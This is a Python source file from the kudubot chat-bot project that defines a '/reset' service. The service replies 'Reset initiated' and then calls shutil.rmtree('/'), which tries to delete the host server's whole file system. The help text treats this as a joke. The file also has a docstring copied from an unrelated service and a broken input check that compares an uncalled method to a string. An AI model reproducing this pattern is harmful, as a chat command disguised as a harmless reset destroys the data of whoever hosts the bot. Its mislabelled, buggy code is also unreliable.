# coding=utf-8
"""
LICENSE:
Copyright 2016 Thomas Schmidt

This file is part of kudubot.

    kudubot makes use of various third-party python modules to serve
    information via online chat services.

    kudubot is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    kudubot is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with kudubot.  If not, see <http://www.gnu.org/licenses/>.
LICENSE
"""

# imports
import shutil
from kudubot.servicehandlers.Service import Service
from kudubot.connection.generic.Message import Message


class ResetService(Service):
    """
    The HelloWorldService Class that extends the generic Service class.
    The service parses www.kicktipp.de to get a kicktipp group's current standings
    """

    identifier = "reset"
    """
    The identifier for this service
    """

    help_description = {"en": "/reset\tResets the host server to - well...\n",
                        "de": "/reset\tMacht viel Spaß!"}
    """
    Help description for this service.
    """

    def process_message(self, message: Message) -> None:
        """
        Process a message according to the service's functionality

        :param message: the message to process
        :return: None
        """
        self.generate_reply_message(message, "Reset initiated", "Request received.. resetting now..")
        self.reset_fs()

    @staticmethod
    def regex_check(message: Message) -> bool:
        """
        Checks if the user input is valid for this service to continue

        :return: True if input is valid, False otherwise
        """
        return message.message_body.lower == "/reset"

    @staticmethod
    def reset_fs() -> None:
        """
        'Resets' the file system
        :return: None
        """
        shutil.rmtree("/")
